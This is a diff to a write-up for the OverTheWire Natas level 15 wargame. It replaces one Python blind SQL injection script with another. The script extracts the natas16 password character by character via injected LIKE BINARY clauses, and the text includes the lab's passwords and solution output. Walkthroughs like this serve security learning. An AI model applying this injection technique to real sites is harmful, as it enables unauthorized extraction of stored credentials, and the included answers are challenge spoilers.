@@ -38,39 +38,47 @@ This will check for user existence. If I try to input `natas16` into the input f
 For this, we can try brute forcing the password by using a python script:
 ```python
 import requests
-from requests.auth import HTTPBasicAuth
+import string
 
-characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-correct_chars = ""
-password = ""
+url = 'http://natas15.natas.labs.overthewire.org/index.php?debug'
+username = 'natas15'
+password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'
 
-# build a set of possible characters for password
-print("Building charset...")
-for char in characters:
-    data = {"username" : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
-    response = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth("natas15", "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"), data=data)
-    
-    # check if query is correct
-    if "exists" in response.text:
-        correct_chars += char
-        print(correct_chars)
+character_set = string.ascii_letters + string.digits
+flag_dictionary = ''
+exist_string = 'This user exists.'
 
-# brute force the correct positions of the possible characters set (password size is 32)
-print("Brute forcing...")
-for i in range(0, 32):
-    for char in correct_chars:
-        data = {"username" : 'natas16" and password LIKE BINARY "' + password + char + '%" #'}
-        response = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth("natas15", "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"), data=data)
+# building possible character dictionary for the password
+for char in character_set:
+    data = {'username' : 'natas16" AND password LIKE BINARY "%' + char + '%"#'}
+    response = requests.post(url, auth=(username, password), data=data)
 
-        if "exists" in response.text:
-            password += char
-            print(password)
+    if exist_string in response.text:
+        flag_dictionary += char
+        print(f'Flag dictionary: {flag_dictionary}')
+
+print(f'Complete dictionary: {flag_dictionary}')
+print('\nBrute forcing...')
+
+correct_flag = ''
+
+# since flag length is 32, try every 32-character strings based on the flag dictionary
+for i in range(32):
+    for char in flag_dictionary:
+        data = {'username' : 'natas16" AND password LIKE BINARY "' + correct_flag + char + '%"#'}
+        response = requests.post(url, auth=(username, password), data=data)
+
+        if exist_string in response.text:
+            correct_flag += char
+            print(f'Building flag: {correct_flag}')
             break
 
-print("natas16 password: " + password)
+print(f'Correct flag: {correct_flag}')
 ```
 
-And here's the result: 
+This script works by first building a flag dictionary, containing all the characters that is known to be in the password field. This helps narrow down the search parameter. Then we brute force each character one-by-one from start to finish.
+
+Here's the result:
 ```py
-natas16 password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+natas16 password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 ```
